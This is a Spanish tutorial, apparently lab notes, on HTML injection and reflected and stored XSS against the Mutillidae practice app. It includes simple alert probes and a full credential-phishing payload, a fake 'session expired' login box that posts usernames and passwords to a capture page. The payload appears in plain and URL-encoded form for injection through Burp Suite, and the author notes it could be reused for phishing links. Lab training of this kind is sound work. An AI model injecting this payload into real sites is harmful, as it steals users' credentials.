# HTML Injection y Cross-Site-Scripting (XSS)

Vamos a explicar estas 2 tecnicas a la vez ya que son muy parecidas y estan muy relacionadas, ya que cuando hagamos un `XSS` estaremos haciendo a la vez un `HTML Injection`.

Por lo que para efectuar este tipo de vulnerabilidad vamos a irnos al apartado de `OWASP 2017` -> `Cross-Site-Scripting (XSS)` -> `Reflected (First Order)` -> `DNS Lookup`

Y veremos algo tal que esto:

<figure><img src="../../../.gitbook/assets/image (82) (1).png" alt=""><figcaption></figcaption></figure>

La funcionalidad legal de este apartado es que cuando nosotros metamos un dominio o IP nos haga una resolucion a dicho dominio o IP dandonos informacion sobre ello, por ejemplo si metemos `www.google.com` tendremos que ver algo asi:

<figure><img src="../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

Esta vulnerabilidad sucede cuando los programadores de alguna manera cuando crearon dicha pagina web, este apartado en concreto, cuando nosotros incluimos texto y este texto se refleja en la pagina web como podemos observar con `www.google.com` no llega a realizar una sanitizacion adecuada sobre ciertos caracteres que nosotros podremos meter y que son caracteres reservados para el lenguaje de `HTML`, con lo cual nosotros podremos incluir caracteres especiales como por ejemplo ``<>"'`, etc...`` las cuales estan incluidos en `HTML` y este mismo lo interpretara como un fragmento de codigo `HTML` por lo que lo representara como tal.

Y esto pasa cuando no es capaz de codificar dichos caracteres, escapar dichos caracteres de alguna manera para que no se interpreten como codigo `HTML`, yo puedo aprovechar esto para injectar codigo que lo que haga sea que cambie la apariencia de dicha pagina web.

Por lo que si ponemos lo siguiente:

```
Hostname/IP = <h1>canario</h1>
```

Veremos que el nombre `canario` se ve mucho mas grande, por lo que esta funcionando la injeccion de codigo (`XSS`):

<figure><img src="../../../.gitbook/assets/image (84) (1).png" alt=""><figcaption></figcaption></figure>

De esta forma parece inofensivo, pero tambien se puede injectar codigo `javascript` por lo que esto ya va siendo mas ofensivo dependiendo de lo que hagamos:

Primero probaremos a poner lo siguiente:

```
Hostname/IP = <script>alert('Vulnerabilidad XSS')</script>
```

Y si todo sale bien, deberemos de ver una alerta cuando lo enviemos, sabiendo que ya 100% es vulnerable este tipo de codigos `XSS`.

<figure><img src="../../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

Ahora lo que vamos hacer es un `HTML Injection` siendo de forma ofensiva, con un `paylaod` que nos proporciona la pagina de `Mutillidae` pero cambiando algunas cosas:

```html
<div id="modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;opacity:.5;z-index:999998;">&nbsp;</div>
	<div style="margin:5% auto;width:100%;position:fixed;top:5%;left:5%;z-index:9999999;">
	<div id="idlogin" style="width:405px;position:relative;margin:0 auto;background-color:white;padding:10px;border:1px solid black;">
	<script>
	function capture(theForm){
		var lXMLHTTP;
		try{
			var lData = "username=" + theForm.username.value + "&password=" + theForm.password.value;
			var lHost = "localhost";
			var lProtocol = "http";
			var lAction = lProtocol + "://" + lHost + "/mutillidae/capture-data.php";
			var lMethod = "post";
			try{
				lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
			}catch (e){
				try{
					lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
				}catch(e) {
					try{
						lXMLHTTP = new XMLHttpRequest();
					}catch (e) {
						alert(e.message);
					};//end try
				};//end try
			};//end try

			lXMLHTTP.onreadystatechange = function(){
				if(lXMLHTTP.readyState == 4){
					theForm.parentNode.style.display="none";
				}// end if
			};

			lXMLHTTP.open(lMethod, lAction, true);
			lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			lXMLHTTP.send(lData);
		}catch(e){
			alert(e.message);
		};
		alert('Thanks! You may continue now.');
		document.getElementById('modal').setAttribute('style', '');
	};//end function
	</script>
	<form>
		<table style="font-weight:bold;">
			<tbody><tr><td colspan="2" style="font-size:20px;">Sorry! Your session has expired.<br><br>Please login again.</td></tr>
			<tr><td colspan="2">&nbsp;</td></tr>
			<tr><td>Username</td><td><input name="username" type="text"></td></tr>
			<tr><td>Password</td><td><input name="password" type="password"></td></tr>
			<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:capture(this.form);" value="      Submit      "></td></tr>
		</tbody></table>
	</form>
</div>
```

La funcionalidad basica de lo que hace este `payload` es que al usuario le salta una alerta de que su cuenta a expirado y que tiene que insertar las credenciales de nuevo para lo que sea, dichas credenciales se envian a un servidor que nosotros queramos o tengamos para recibirlas por parte del atacante, pero como en este caso no tenemos ningun servidor, lo haremos de la siguiente forma:

La propia pagina de `Mutillidae` tiene por asi decirlo un apartado que actua como nuestro servidor del atacante para que lo que ponga el usuario llegue a ese apartado que nosotros hemos configurado, por lo que nos tendremos que ir a `Data Capture Page` -> `View Captured Data`:

<figure><img src="../../../.gitbook/assets/image (86) (1).png" alt=""><figcaption></figcaption></figure>

Eso actua como nuestro servidor y donde podremos ver las credenciales capturadas, por lo que los cambios que realizaremos al `payload` serian los siguientes.

Primero quitar el `localhost` y poner la IP de la maquina donde esta corriendo `Mutillidae` que en mi caso seria la `192.168.5.177` y en la parte de `lAction` cambiaremos la URL para que le redirija al servidor que en nuestro caso es el `Captured Data`, por lo que pondremos algo como `/src/index.php?page=captured-data.php` quedando algo tal que asi el codigo:

```html
<div id="modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;opacity:.5;z-index:999998;">&nbsp;</div>
	<div style="margin:5% auto;width:100%;position:fixed;top:5%;left:5%;z-index:9999999;">
	<div id="idlogin" style="width:405px;position:relative;margin:0 auto;background-color:white;padding:10px;border:1px solid black;">
	<script>
	function capture(theForm){
		var lXMLHTTP;
		try{
			var lData = "username=" + theForm.username.value + "&password=" + theForm.password.value;
			var lHost = "192.168.5.177";
			var lProtocol = "http";
			var lAction = lProtocol + "://" + lHost + "/mutillidae/src/index.php?page=capture-data.php";
			var lMethod = "post";
			try{
				lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
			}catch (e){
				try{
					lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
				}catch(e) {
					try{
						lXMLHTTP = new XMLHttpRequest();
					}catch (e) {
						alert(e.message);
					};//end try
				};//end try
			};//end try

			lXMLHTTP.onreadystatechange = function(){
				if(lXMLHTTP.readyState == 4){
					theForm.parentNode.style.display="none";
				}// end if
			};

			lXMLHTTP.open(lMethod, lAction, true);
			lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			lXMLHTTP.send(lData);
		}catch(e){
			alert(e.message);
		};
		alert('Thanks! You may continue now.');
		document.getElementById('modal').setAttribute('style', '');
	};//end function
	</script>
	<form>
		<table style="font-weight:bold;">
			<tbody><tr><td colspan="2" style="font-size:20px;">Sorry! Your session has expired.<br><br>Please login again.</td></tr>
			<tr><td colspan="2">&nbsp;</td></tr>
			<tr><td>Username</td><td><input name="username" type="text"></td></tr>
			<tr><td>Password</td><td><input name="password" type="password"></td></tr>
			<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:capture(this.form);" value="      Submit      "></td></tr>
		</tbody></table>
	</form>
</div>
```

Ahora nos volvemos a nuestro `DNS Lookup`, ponemos la palabra por ejemplo `canario` y con `Burp Suite` a la escucha enciamos la peticion para que la capture `Burp Suite`:

<figure><img src="../../../.gitbook/assets/image (87) (1).png" alt=""><figcaption></figcaption></figure>

Teniendo la peticion capturada lo que tendremos que hacer sera codificar todo esto ya que hay saltos de linea, muchos caracteres, espacios, etc... Por lo que nos iremos al `Decoder` de `Burp Suite`, en el pegaremos el codigo y le daremos a la opcion de `Encode as ...` en tipo de `URL` viendose algo asi:

```
%3c%64%69%76%20%69%64%3d%22%6d%6f%64%61%6c%22%20%73%74%79%6c%65%3d%22%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%30%3b%6c%65%66%74%3a%30%3b%77%69%64%74%68%3a%31%30%30%25%3b%68%65%69%67%68%74%3a%31%30%30%25%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%62%6c%61%63%6b%3b%6f%70%61%63%69%74%79%3a%2e%35%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%38%3b%22%3e%26%6e%62%73%70%3b%3c%2f%64%69%76%3e%0a%09%3c%64%69%76%20%73%74%79%6c%65%3d%22%6d%61%72%67%69%6e%3a%35%25%20%61%75%74%6f%3b%77%69%64%74%68%3a%31%30%30%25%3b%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%35%25%3b%6c%65%66%74%3a%35%25%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%39%39%3b%22%3e%0a%09%3c%64%69%76%20%69%64%3d%22%69%64%6c%6f%67%69%6e%22%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%34%30%35%70%78%3b%70%6f%73%69%74%69%6f%6e%3a%72%65%6c%61%74%69%76%65%3b%6d%61%72%67%69%6e%3a%30%20%61%75%74%6f%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%77%68%69%74%65%3b%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%62%6f%72%64%65%72%3a%31%70%78%20%73%6f%6c%69%64%20%62%6c%61%63%6b%3b%22%3e%0a%09%3c%73%63%72%69%70%74%3e%0a%09%66%75%6e%63%74%69%6f%6e%20%63%61%70%74%75%72%65%28%74%68%65%46%6f%72%6d%29%7b%0a%09%09%76%61%72%20%6c%58%4d%4c%48%54%54%50%3b%0a%09%09%74%72%79%7b%0a%09%09%09%76%61%72%20%6c%44%61%74%61%20%3d%20%22%75%73%65%72%6e%61%6d%65%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%75%73%65%72%6e%61%6d%65%2e%76%61%6c%75%65%20%2b%20%22%26%70%61%73%73%77%6f%72%64%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%70%61%73%73%77%6f%72%64%2e%76%61%6c%75%65%3b%0a%09%09%09%76%61%72%20%6c%48%6f%73%74%20%3d%20%22%31%39%32%2e%31%36%38%2e%35%2e%31%37%37%22%3b%0a%09%09%09%76%61%72%20%6c%50%72%6f%74%6f%63%6f%6c%20%3d%20%22%68%74%74%70%22%3b%0a%09%09%09%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%6c%50%72%6f%74%6f%63%6f%6c%20%2b%20%22%3a%2f%2f%22%20%2b%20%6c%48%6f%73%74%20%2b%20%22%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%73%72%63%2f%69%6e%64%65%78%2e%70%68%70%3f%70%61%67%65%3d%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%22%3b%0a%09%09%09%76%61%72%20%6c%4d%65%74%68%6f%64%20%3d%20%22%70%6f%73%74%22%3b%0a%09%09%09%74%72%79%7b%0a%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%73%78%6d%6c%32%2e%58%4d%4c%48%54%54%50%22%29%3b%0a%09%09%09%7d%63%61%74%63%68%20%28%65%29%7b%0a%09%09%09%09%74%72%79%7b%0a%09%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%69%63%72%6f%73%6f%66%74%2e%58%4d%4c%48%54%54%50%22%29%3b%0a%09%09%09%09%7d%63%61%74%63%68%28%65%29%20%7b%0a%09%09%09%09%09%74%72%79%7b%0a%09%09%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%09%09%09%09%09%7d%63%61%74%63%68%20%28%65%29%20%7b%0a%09%09%09%09%09%09%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%0a%09%09%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%09%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%0a%09%09%09%09%69%66%28%6c%58%4d%4c%48%54%54%50%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%34%29%7b%0a%09%09%09%09%09%74%68%65%46%6f%72%6d%2e%70%61%72%65%6e%74%4e%6f%64%65%2e%73%74%79%6c%65%2e%64%69%73%70%6c%61%79%3d%22%6e%6f%6e%65%22%3b%0a%09%09%09%09%7d%2f%2f%20%65%6e%64%20%69%66%0a%09%09%09%7d%3b%0a%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%6c%4d%65%74%68%6f%64%2c%20%6c%41%63%74%69%6f%6e%2c%20%74%72%75%65%29%3b%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%09%09%7d%63%61%74%63%68%28%65%29%7b%0a%09%09%09%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%0a%09%09%7d%3b%0a%09%09%61%6c%65%72%74%28%27%54%68%61%6e%6b%73%21%20%59%6f%75%20%6d%61%79%20%63%6f%6e%74%69%6e%75%65%20%6e%6f%77%2e%27%29%3b%0a%09%09%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%6d%6f%64%61%6c%27%29%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%27%73%74%79%6c%65%27%2c%20%27%27%29%3b%0a%09%7d%3b%2f%2f%65%6e%64%20%66%75%6e%63%74%69%6f%6e%0a%09%3c%2f%73%63%72%69%70%74%3e%0a%09%3c%66%6f%72%6d%3e%0a%09%09%3c%74%61%62%6c%65%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%77%65%69%67%68%74%3a%62%6f%6c%64%3b%22%3e%0a%09%09%09%3c%74%62%6f%64%79%3e%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%73%69%7a%65%3a%32%30%70%78%3b%22%3e%53%6f%72%72%79%21%20%59%6f%75%72%20%73%65%73%73%69%6f%6e%20%68%61%73%20%65%78%70%69%72%65%64%2e%3c%62%72%3e%3c%62%72%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%61%67%61%69%6e%2e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%3e%26%6e%62%73%70%3b%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%3e%55%73%65%72%6e%61%6d%65%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%75%73%65%72%6e%61%6d%65%22%20%74%79%70%65%3d%22%74%65%78%74%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%3e%50%61%73%73%77%6f%72%64%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%70%61%73%73%77%6f%72%64%22%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%61%6c%69%67%6e%3a%63%65%6e%74%65%72%3b%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%62%75%74%74%6f%6e%22%20%6f%6e%63%6c%69%63%6b%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%63%61%70%74%75%72%65%28%74%68%69%73%2e%66%6f%72%6d%29%3b%22%20%76%61%6c%75%65%3d%22%20%20%20%20%20%20%53%75%62%6d%69%74%20%20%20%20%20%20%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%3c%2f%74%62%6f%64%79%3e%3c%2f%74%61%62%6c%65%3e%0a%09%3c%2f%66%6f%72%6d%3e%0a%3c%2f%64%69%76%3e
```

Pues todo esto lo tendremos que pegar sustituyendo la palabra `canario` por todo este tocho, quedando algo asi:

<figure><img src="../../../.gitbook/assets/image (88) (1).png" alt=""><figcaption></figcaption></figure>

Y si ahora le damos a `Forward` veremos en la pagina lo siguiente:

<figure><img src="../../../.gitbook/assets/image (89) (1).png" alt=""><figcaption></figcaption></figure>

El panel que comente donde pondra que la sesion a expirado y habra que volver a poner las credenciales, por lo que el usuario lo hara y esto llegara a nuestro servidor del atacante en la parte esa de la pagina de `Mutillidae` que mencione.

Metiendo las credenciales pondra esto otro:

<figure><img src="../../../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure>

Y aqui nos pondra `Gracias ya puedes continuar`, por lo que las credenciales ya las habriamos capturado, ahora solo tendremos que irnos al siguiente apartado para verlas:

Iremos a `Data Capture Page` -> `View Captured Data` -> y veremos las credenciales:

<figure><img src="../../../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>

Con este tipo de tecnicas tambien se podria hacer un `phishing` en el que cuando piche en un link que le enviemos aparezca este popup y cuando meta las credenciales lleguen al servidor de atacante.

Pero especificamente este tipo de tecnica se le llama un `Cross-Site-Scripting (XSS) - Reflected`, pero uno mas interesante es el poder dejar ese codigo de forma permanente en la pagina para que aparezca ese popup cada vez que cualquier usuario ingrese en ese apartado a esto se le llama un `Cross-Site-Scripting (XSS) - Persistent/Stored`.

Para probar esto nos iremos al siguiente apartado de la pagina web:

`OWASP 2017` -> `Cross-Site-Scripting (XSS)` -> `Persistent (Second Order)` -> `Add to your blog`.

<figure><img src="../../../.gitbook/assets/image (92) (1).png" alt=""><figcaption></figcaption></figure>

En este apartado el funcionamiento legal es que nosotros podemos escribir un blog o un comentario el cual se va a quedar reflejado en la pagina web.

Pero como ya dije antes, si no esta bien sanitizadas las entradas de los caracteres especiales, podremos hacer un `XSS` o `HTML Injection`.

Si nosotros por ejemplo ponemos:

```
<h1>canario</h1>
```

Podremos ver que el texto se escribe mas grande por lo que funciona, pero no solo funciona eso, si no que se queda reflejado en la pagina web y cada vez que entre un usuario se le va a ejecutar eso por lo que los demas podrian ver eso mismo:

<figure><img src="../../../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos hacer lo mismo de antes, para que cada vez que un usuario ingrese en este apartado le aparezca el popup de meter las credenciales por que su cuenta a expirado.

Pondremos el `Burp Suite` a escuchar y una vez enviada la peticion, pondremos el codigo codificado reemplazando la palabra `canario` o lo que hayamos metido del popup, quedando algo asi:

<figure><img src="../../../.gitbook/assets/image (94) (1).png" alt=""><figcaption></figcaption></figure>

Pero en el codigo tendremos que reemplazar todas las comillas simples (`'`) por comillas dobles (`"`) por que si no dara error.

```html
<div id="modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;opacity:.5;z-index:999998;">&nbsp;</div>
	<div style="margin:5% auto;width:100%;position:fixed;top:5%;left:5%;z-index:9999999;">
	<div id="idlogin" style="width:405px;position:relative;margin:0 auto;background-color:white;padding:10px;border:1px solid black;">
	<script>
	function capture(theForm){
		var lXMLHTTP;
		try{
			var lData = "username=" + theForm.username.value + "&password=" + theForm.password.value;
			var lHost = "192.168.5.177";
			var lProtocol = "http";
			var lAction = lProtocol + "://" + lHost + "/mutillidae/src/index.php?page=capture-data.php";
			var lMethod = "post";
			try{
				lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
			}catch (e){
				try{
					lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
				}catch(e) {
					try{
						lXMLHTTP = new XMLHttpRequest();
					}catch (e) {
						alert(e.message);
					};//end try
				};//end try
			};//end try

			lXMLHTTP.onreadystatechange = function(){
				if(lXMLHTTP.readyState == 4){
					theForm.parentNode.style.display="none";
				}// end if
			};

			lXMLHTTP.open(lMethod, lAction, true);
			lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			lXMLHTTP.send(lData);
		}catch(e){
			alert(e.message);
		};
		alert("Thanks! You may continue now.");
		document.getElementById("modal").setAttribute("style", "");
	};//end function
	</script>
	<form>
		<table style="font-weight:bold;">
			<tbody><tr><td colspan="2" style="font-size:20px;">Sorry! Your session has expired.<br><br>Please login again.</td></tr>
			<tr><td colspan="2">&nbsp;</td></tr>
			<tr><td>Username</td><td><input name="username" type="text"></td></tr>
			<tr><td>Password</td><td><input name="password" type="password"></td></tr>
			<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:capture(this.form);" value="      Submit      "></td></tr>
		</tbody></table>
	</form>
</div>
```

Y codificado quedaria asi:

```
%3c%64%69%76%20%69%64%3d%22%6d%6f%64%61%6c%22%20%73%74%79%6c%65%3d%22%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%30%3b%6c%65%66%74%3a%30%3b%77%69%64%74%68%3a%31%30%30%25%3b%68%65%69%67%68%74%3a%31%30%30%25%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%62%6c%61%63%6b%3b%6f%70%61%63%69%74%79%3a%2e%35%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%38%3b%22%3e%26%6e%62%73%70%3b%3c%2f%64%69%76%3e%0a%09%3c%64%69%76%20%73%74%79%6c%65%3d%22%6d%61%72%67%69%6e%3a%35%25%20%61%75%74%6f%3b%77%69%64%74%68%3a%31%30%30%25%3b%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%35%25%3b%6c%65%66%74%3a%35%25%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%39%39%3b%22%3e%0a%09%3c%64%69%76%20%69%64%3d%22%69%64%6c%6f%67%69%6e%22%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%34%30%35%70%78%3b%70%6f%73%69%74%69%6f%6e%3a%72%65%6c%61%74%69%76%65%3b%6d%61%72%67%69%6e%3a%30%20%61%75%74%6f%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%77%68%69%74%65%3b%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%62%6f%72%64%65%72%3a%31%70%78%20%73%6f%6c%69%64%20%62%6c%61%63%6b%3b%22%3e%0a%09%3c%73%63%72%69%70%74%3e%0a%09%66%75%6e%63%74%69%6f%6e%20%63%61%70%74%75%72%65%28%74%68%65%46%6f%72%6d%29%7b%0a%09%09%76%61%72%20%6c%58%4d%4c%48%54%54%50%3b%0a%09%09%74%72%79%7b%0a%09%09%09%76%61%72%20%6c%44%61%74%61%20%3d%20%22%75%73%65%72%6e%61%6d%65%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%75%73%65%72%6e%61%6d%65%2e%76%61%6c%75%65%20%2b%20%22%26%70%61%73%73%77%6f%72%64%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%70%61%73%73%77%6f%72%64%2e%76%61%6c%75%65%3b%0a%09%09%09%76%61%72%20%6c%48%6f%73%74%20%3d%20%22%31%39%32%2e%31%36%38%2e%35%2e%31%37%37%22%3b%0a%09%09%09%76%61%72%20%6c%50%72%6f%74%6f%63%6f%6c%20%3d%20%22%68%74%74%70%22%3b%0a%09%09%09%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%6c%50%72%6f%74%6f%63%6f%6c%20%2b%20%22%3a%2f%2f%22%20%2b%20%6c%48%6f%73%74%20%2b%20%22%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%73%72%63%2f%69%6e%64%65%78%2e%70%68%70%3f%70%61%67%65%3d%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%22%3b%0a%09%09%09%76%61%72%20%6c%4d%65%74%68%6f%64%20%3d%20%22%70%6f%73%74%22%3b%0a%09%09%09%74%72%79%7b%0a%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%73%78%6d%6c%32%2e%58%4d%4c%48%54%54%50%22%29%3b%0a%09%09%09%7d%63%61%74%63%68%20%28%65%29%7b%0a%09%09%09%09%74%72%79%7b%0a%09%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%69%63%72%6f%73%6f%66%74%2e%58%4d%4c%48%54%54%50%22%29%3b%0a%09%09%09%09%7d%63%61%74%63%68%28%65%29%20%7b%0a%09%09%09%09%09%74%72%79%7b%0a%09%09%09%09%09%09%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%09%09%09%09%09%7d%63%61%74%63%68%20%28%65%29%20%7b%0a%09%09%09%09%09%09%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%0a%09%09%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%09%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%09%09%09%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%0a%09%09%09%09%69%66%28%6c%58%4d%4c%48%54%54%50%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%34%29%7b%0a%09%09%09%09%09%74%68%65%46%6f%72%6d%2e%70%61%72%65%6e%74%4e%6f%64%65%2e%73%74%79%6c%65%2e%64%69%73%70%6c%61%79%3d%22%6e%6f%6e%65%22%3b%0a%09%09%09%09%7d%2f%2f%20%65%6e%64%20%69%66%0a%09%09%09%7d%3b%0a%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%6c%4d%65%74%68%6f%64%2c%20%6c%41%63%74%69%6f%6e%2c%20%74%72%75%65%29%3b%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%0a%09%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%09%09%7d%63%61%74%63%68%28%65%29%7b%0a%09%09%09%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%0a%09%09%7d%3b%0a%09%09%61%6c%65%72%74%28%22%54%68%61%6e%6b%73%21%20%59%6f%75%20%6d%61%79%20%63%6f%6e%74%69%6e%75%65%20%6e%6f%77%2e%22%29%3b%0a%09%09%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6d%6f%64%61%6c%22%29%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%79%6c%65%22%2c%20%22%22%29%3b%0a%09%7d%3b%2f%2f%65%6e%64%20%66%75%6e%63%74%69%6f%6e%0a%09%3c%2f%73%63%72%69%70%74%3e%0a%09%3c%66%6f%72%6d%3e%0a%09%09%3c%74%61%62%6c%65%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%77%65%69%67%68%74%3a%62%6f%6c%64%3b%22%3e%0a%09%09%09%3c%74%62%6f%64%79%3e%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%73%69%7a%65%3a%32%30%70%78%3b%22%3e%53%6f%72%72%79%21%20%59%6f%75%72%20%73%65%73%73%69%6f%6e%20%68%61%73%20%65%78%70%69%72%65%64%2e%3c%62%72%3e%3c%62%72%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%61%67%61%69%6e%2e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%3e%26%6e%62%73%70%3b%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%3e%55%73%65%72%6e%61%6d%65%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%75%73%65%72%6e%61%6d%65%22%20%74%79%70%65%3d%22%74%65%78%74%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%3e%50%61%73%73%77%6f%72%64%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%70%61%73%73%77%6f%72%64%22%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%09%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%